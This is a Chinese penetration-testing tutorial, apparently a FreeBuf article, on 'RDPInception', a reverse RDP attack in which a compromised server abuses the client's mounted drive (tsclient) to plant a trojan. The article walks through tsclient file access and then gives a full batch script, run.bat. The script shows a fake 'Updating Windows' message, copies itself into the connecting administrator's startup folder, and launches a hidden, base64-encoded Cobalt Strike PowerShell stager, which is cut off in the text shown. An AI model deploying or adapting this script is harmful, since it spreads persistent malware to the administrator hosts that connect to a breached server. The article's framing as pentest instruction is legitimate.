![image-20210712211001617](https://image.3001.net/images/20210713/1626150282_60ed158a742dda602e0df.png!small)

往期文章：

> [《内网渗透测试：初探远程桌面的安全问题》](https://www.freebuf.com/articles/network/276242.html)
>
> 《内网渗透测试：桌面劫持实现未授权登录》

## 前言

通常认为远程桌面协议是连接远程计算机的安全且值得信赖的应用程序，全球数以千计的 IT
专业人员和安全研究人员都在使用远程桌面协议管理者自己的计算机设备，无论是用于帮助远程工作人员还是在安全的 VM 环境中工作，RDP
远程桌面客户端都是非常宝贵的工具。然而，这一值得信赖的应用程序并不是完全可靠的，在我的[《内网渗透测试：初探远程桌面的安全问题》](https://www.freebuf.com/articles/network/276242.html)这篇文章中，我大致罗列出了常见的用于攻击
RDP 远程桌面的方式。本节我们就一个问题进行探讨，即如何通过远程桌面服务端反打连接他的客户端。

如今，在很多组织机构内部，针对 DMZ 或隔离网络区域内的计算机设备，为了限制其它接入端口风险，通常只允许这些设备开启 3389
端口，使用远程桌面来进行管理维护，这样，所有正向攻击手段都无法使用。那这样真的就万无一失了吗？当然不是。本节我们就来研究如何通过 RDP
反向攻击的方式针对这种受限网络设备完成渗透测试。

RDP 反向攻击的姿势有不少，本节我们主要针对最简单的一个姿势来进行进行讲解，即通过挂载盘符进行 RDP 反向攻击。其基本原理就是Windows
远程桌面客户端 mstsc 有一个盘符挂载选项，如果勾选了该选项，会开启磁盘共享功能，相当于将你的磁盘再远程主机上共享，你可以通过类似于 SMB
文件传输命令那样将位于远程主机上的文件复制到客户端主机上。如果我们通过相应的设置，在客户端连接远程主机的一瞬间，将远程主机上早已准备好的木马程序复制到客户端主机的启动项中，那么当客户端主机下一次启动时便会执行该木程序，客户端主机便可以成功上线。这种攻击方法又被称作
RDPInception。

## Mstsc 挂载盘符

这里利用了Windows 远程桌面客户端 mstsc.exe 连接时的一个选项：

![image-20210712211001617](https://image.3001.net/images/20210713/1626150282_60ed158a742dda602e0df.png!small)

连接目标主机时，如果像上图那样在 mstsc.exe 中开启驱动器共享的话，那么客户端进行远程登陆后，在远程远程主机的 “网络” 中便可以发现一个名为
“tsclient” 的主机：

![image-20210712213431202](https://image.3001.net/images/20210713/1626150283_60ed158b79ab1c1c624f3.png!small)

这其实就是开启磁盘共享后，远程主机为连接他的客户端主机分配的名称。然后通过以下格式的命令便可以在远程主机上面访问连接他的客户端主机了：

    
    
    dir \\tsclient\c    # 列出连接远程主机的本机 C 盘目录  
    copy file \\tsclient\c    # 将文件复制到连接远程主机的本机中  
    ​  
    # \\tsclient\盘符

如下图，我们使用 “tsclient” 列出了客户端主机上的 C 盘目录：

![image-20210712213922868](https://image.3001.net/images/20210713/1626150283_60ed158be20bc701b26dd.png!small)

如下图所示，我们使用 “tsclient” 将远程主机上的 test.txt 成功复制到了客户端主机：

![image-20210712214851175](https://image.3001.net/images/20210713/1626150284_60ed158c584fe865ece9b.png!small)

这种访问方式类似于使用 SMB 进行文件传输，虽然本质上都是 SMB 协议，但是使用 tsclient 无需进行身份认证。

但要注意的是，只有通过远程登陆的用户才可以在远程主机中访问 tsclient，其他在远程主机上本地登录的用户是无论如何也无法访问 tsclient 的。

## RDP 反向攻击测试（初探）

实验环境：

![image-20210713103049331](https://image.3001.net/images/20210713/1626150284_60ed158ce3aec746eaa8e.png!small)

假设攻击者已经通过各种手段拿下了 Windows Server 2012 这台服务器，但是目标网络环境为了限制其它接入端口风险，只允许Windows
Server 2012 开启 3389 端口，由位于更深一层网络中的管理员主机 Windows 10 使用远程桌面来进行管理维护，那我们该如何通过
Windows Server 2012 进行横向渗透并拿下这台 Windows 10 管理员主机呢？

我们的思路是，在远程主机的启动项中写入一个 .bat
脚本（run.bat），当一个客户端用户通过远程桌面连接到这个远程主机时，在登陆之后会立即执行这个启动项中的 run.bat 脚本。start.bat
脚本执行后会首先遍历 tsclient 共享，发现 tsclient 共享后就会将自己复制到 tsclient
也就是连接远程主机的客户端主机上的启动项中，然后执行一个 Cobalt Strike 生成的 PowerShell
Stager。然后，当客户端主机重启或者注销重新登录后就会再次进行上述过程，同时会使客户端主机上线。下面我们演示攻击过程。

首先简单编写一个 run.bat（仅提供测试使用）：

    
    
    # 关闭echo响应功能
    @echo off
    
    echo Updating Windows ...
    
    # 关闭echo响应功能
    @echo off
    # 设置一个短时计数器，以确保tsclient进程被完全加载
    timeout 1 >nul 2>&1
    
    # 如果当前远程主机上可以访问到 tsclient, 则可以成功将 run.bat 通过 tsclient 复制到客户端主机上
    copy "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\run.bat" "\\tsclient\C\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    
    # 最后执行 Cobalt Strike 生成的 PowerShell Stager
    powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABT

